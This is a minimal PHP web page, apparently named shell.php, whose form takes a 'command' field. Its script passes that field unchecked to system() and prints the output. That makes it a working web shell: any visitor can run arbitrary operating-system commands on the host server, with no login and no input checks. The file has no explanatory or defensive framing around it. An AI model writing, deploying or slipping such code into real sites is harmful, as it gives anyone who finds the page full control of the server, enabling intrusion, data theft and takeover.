<html lang="it">
<head>
<title>Command Line</title>
<meta charset="utf-8">
</head>
<body>
<form method="post" action="shell.php">
Command: <input type="text" name="command">
<input type="submit" value="Enter">
</form>
<?php
$command = $_POST['command'];
echo '<pre>';
$last = system($command);
echo '</pre>';
?>
</body>
</html>
